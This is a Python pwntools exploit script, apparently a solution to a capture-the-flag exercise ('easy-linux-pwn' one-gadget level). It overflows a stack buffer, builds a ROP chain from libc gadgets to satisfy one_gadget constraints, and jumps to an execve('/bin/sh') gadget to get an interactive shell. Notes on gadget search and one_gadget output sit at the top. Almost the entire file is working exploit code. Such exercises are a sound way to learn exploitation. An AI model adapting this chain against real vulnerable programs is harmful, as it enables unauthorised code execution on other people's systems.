#!/usr/bin/python

# jump to a one_gadget address. Make sure to satisfy the required constaints if
# there are any. For some of the architectures this might require using a ROP
# chain, which technically makes "one_gadget" no longer "one".

# 0x7ffff7dd9000     0x7ffff7f46000 r-xp   16d000  28000 /usr/lib64/libc.so.6
#  0x7ffff7dd9000+0x1047d0 -> 12c7d0
#  0x7ffff7dd9000+? -> 0x1047cf

'''
candidates looking for [rsp+0x70] -> 0x0:

arb write (missing)
0x00000000000a7cd4 : pop rax ; ret
0x000000000009a16c : adc al, 0 ; mov dword ptr [rax], edx ; ret

decrement there?
0x00000000000c5c2a : adc edi, ecx ; dec dword ptr [rax - 0x7d] ; ret
'''

'''
~> ~/.local/share/gem/ruby/gems/one_gadget-1.10.0/bin/one_gadget /usr/lib64/libc.so.6
0xe5e9a execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv ; ok
  [r12] == NULL || r12 == NULL || r12 is a valid envp ; r12 = 1

0x1047c2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0x1047ca posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r13)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0x1047cf posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r13)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
  rdx == NULL || (s32)[rdx+0x4] <= 0
'''



import struct
import sys

from pwn import *


context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = '/home/gbrls/ctf/easy-linux-pwn/bin/x86-64/03-one-gadget'

# this gadged had some error after calling posix_spawn
def posix_spawn():
    p = b''
    p += p64(0x7ffff7e4a288) # xor edx, edx ; mov rax, rdx ; ret)
    p += p64(libc_off + 0xa7cd4 ) # pop rax ; ret
    p += p64(0x7fffffffd918) # $rsp + 0x70
    p += p64(libc_off + 0x9a16c ) # adc al, 0 ; mov dword ptr [rax], edx ; ret
    p += p64(libc_off + 0x1047cf) # one_gadget
    return p

p = process(binary_path)
#p = gdb.debug(binary_path, '''
#    set follow-fork-mode child
#''')


libc_off = 0x7ffff7dd9000 - 0x28000

# offset padding
payload = b''
payload += b'A' * 128
payload += b'A' * 8

# constraints
payload += p64(0x00000000000d4337 + libc_off) # add al, 0x98 ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
payload += p64(0) # rbx
payload += p64(0) # r12
payload += p64(0) # r13
payload += p64(0x7fffffffd8a0) # rbp
payload += p64(0x000000000016dd77 + libc_off) # pop rdi ; add rax, rdi ; vzeroupper ; ret
payload += p64(0) # rdi

# execve one_gadget
payload += p64(0xe5e9a + libc_off)
payload += p64(p.elf.symbols['main'])

p.readuntil('> ')
p.write(payload)
p.interactive()
